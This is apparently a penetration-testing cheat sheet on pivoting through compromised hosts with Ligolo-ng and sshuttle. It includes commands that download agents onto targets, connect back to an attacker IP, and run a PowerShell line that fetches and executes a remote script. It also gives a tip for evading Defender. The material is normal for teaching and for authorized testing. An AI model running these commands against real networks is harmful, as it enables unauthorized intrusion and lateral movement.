# 🔀 Ligolo-ng — Pivot the Right Way

> **Scope:** Authorized penetration testing / lab environments only (HTB, OSCP prep, etc.)

---

## What & Why

Ligolo-ng creates a **TUN interface tunnel** from a reverse TCP/TLS connection. Unlike SOCKS proxies, it gives you a real network interface — meaning tools like `nmap`, `impacket`, and raw TCP/UDP work without proxychains.

| Tool | Interface | nmap scripts | UDP | Setup |
|---|---|---|---|---|
| Chisel | SOCKS | ❌ | ❌ | Medium |
| sshuttle | TUN | ✅ | ⚠️ | Easy |
| **Ligolo-ng** | **TUN** | **✅** | **✅** | **Easy** |

---

## 📥 Installation

```bash
cd /opt && mkdir ligolo && cd ligolo

# Proxy (runs on YOUR machine)
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_Linux_64bit.tar.gz
tar -xvf ligolo-ng_proxy_Linux_64bit.tar.gz && mv proxy lin-proxy

# Agent (pushed to TARGET)
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_Linux_64bit.tar.gz
tar -xvf ligolo-ng_agent_Linux_64bit.tar.gz && mv agent lin-agent

# Windows agent (for Windows targets)
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_Windows_64bit.zip
unzip ligolo-ng_agent_Windows_64bit.zip && mv agent.exe win-agent.exe
```

> **Tip:** Always grab the latest release tag from [github.com/nicocha30/ligolo-ng/releases](https://github.com/nicocha30/ligolo-ng/releases) — the version in the URL above may lag behind.

---

## ⚙️ Attacker Machine Setup (do this once)

```bash
# Create the TUN interface
sudo ip tuntap add user $USER mode tun ligolo

# Bring it up
sudo ip link set ligolo up

# Verify
ip addr show ligolo
```

Start the proxy — port 443 is recommended as it's rarely blocked by firewalls:

```bash
./lin-proxy -selfcert -laddr 0.0.0.0:443
```

> **Tip:** `-selfcert` auto-generates a certificate. For ops where cert pinning matters, use `-letsencrypt` with a real domain instead.

---

## 🗺️ Scenario Overview

```text
 [Attacker]          [Pivot 1]           [Pivot 2]          [Target]
 10.10.14.10  ──── 172.16.1.14  ───── 172.16.5.20  ───── 172.16.5.25
               agent 1 here         agent 2 here        file server
```

Goal: reach `172.16.5.25` from `10.10.14.10` through two pivot hops.

---

## 🚀 Single Pivot

### Step 1 — Deliver the agent to Pivot 1

Serve it from your machine:

```bash
sudo python3 -m http.server 80
```

On the Linux target:

```bash
wget http://10.10.14.10/lin-agent
chmod +x lin-agent
./lin-agent -connect 10.10.14.10:443 -ignore-cert
```

On a Windows target:

```bash
certutil.exe -urlcache -split -f "http://10.10.14.10/win-agent.exe" win-agent.exe
.\win-agent.exe -connect 10.10.14.10:443 -ignore-cert
```

> **Tip:** If Defender is active, try downloading via `(New-Object Net.WebClient).DownloadFile()` or encode the binary as base64.

### Step 2 — Connect the session

Back in the proxy console you'll see:

```text
INFO[0102] Agent joined. name=WS-01 remote="172.16.1.14:38000"
```

Select and start:

```text
ligolo-ng » session
? Specify a session: 1 - WS-01 - 172.16.1.14:38000
[Agent : WS-01] » start
INFO[0120] Starting tunnel to WS-01
```

### Step 3 — Add the route

```bash
sudo ip route add 172.16.5.0/24 dev ligolo
```

You can now hit anything in `172.16.5.0/24` directly from your attacker box.

---

## 🔀 Double Pivot

Ligolo only tunnels **one active session at a time**, but you can have multiple agents connected and switch between them freely.

### Step 1 — Enumerate from Pivot 1

On the compromised Linux machine:

```bash
ip route
ifconfig
netstat -an
```

On a Windows machine:

```bash
netstat -an | findstr "ESTABLISHED"
ipconfig /all
# or with PowerView:
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.10/powerview.ps1')
Get-NetForestTrust
```

> **Tip:** Look for additional network interfaces or established connections to subnets you haven't seen yet — those are your next pivot targets.

### Step 2 — Deploy agent on Pivot 2

From your already-tunneled access to `172.16.5.20`, deliver and run the agent the same way as Step 1 above.

### Step 3 — Switch the active session

In the proxy console:

```text
[Agent : WS-01] » session
? Specify a session: 2 - DC-01 - 172.16.5.20:27660
[Agent : DC-01] » start
? Tunnel already running, switch from WS-01 to DC-01? (y/N) Yes
INFO[0450] Closing tunnel to WS-01...
INFO[0451] Starting tunnel to DC-01
```

### Step 4 — Add the new route

```bash
sudo ip route add 172.16.5.25/32 dev ligolo
# or the whole subnet if needed:
sudo ip route add 172.16.5.0/24 dev ligolo
```

You can now reach `172.16.5.25` directly. 🎉

---

## 🔁 sshuttle (Quick Alternative for First Hop)

If you already have SSH credentials to a pivot host and just need fast access to a subnet:

```bash
sshuttle -r user@172.16.1.14 172.16.1.0/24 --ssh-cmd "ssh -i id_rsa"
```

> **When to use it:** sshuttle is great for a quick first hop when you have SSH. Use Ligolo-ng once you're deeper in the network where SSH isn't available.

---

## 🧹 Cleanup

```bash
# Remove routes
sudo ip route del 172.16.5.0/24 dev ligolo
sudo ip route del 172.16.5.25/32 dev ligolo

# Tear down the interface
sudo ip link set ligolo down
sudo ip tuntap del mode tun ligolo

# Verify it's gone
ip addr show ligolo 2>&1 | grep -q ligolo && echo "still up" || echo "cleaned"
```

---

## 📋 Quick Reference

```text
ACTION                          COMMAND
────────────────────────────────────────────────────────────────
Create TUN interface            sudo ip tuntap add user $USER mode tun ligolo
Bring interface up              sudo ip link set ligolo up
Start proxy (attacker)          ./lin-proxy -selfcert -laddr 0.0.0.0:443
Connect agent (Linux target)    ./lin-agent -connect <IP>:443 -ignore-cert
Connect agent (Windows target)  .\win-agent.exe -connect <IP>:443 -ignore-cert
List sessions                   session  (in proxy console)
Start tunnel                    start    (in proxy console)
Add route                       sudo ip route add <subnet> dev ligolo
Remove route                    sudo ip route del <subnet> dev ligolo
Tear down interface             sudo ip link set ligolo down
```
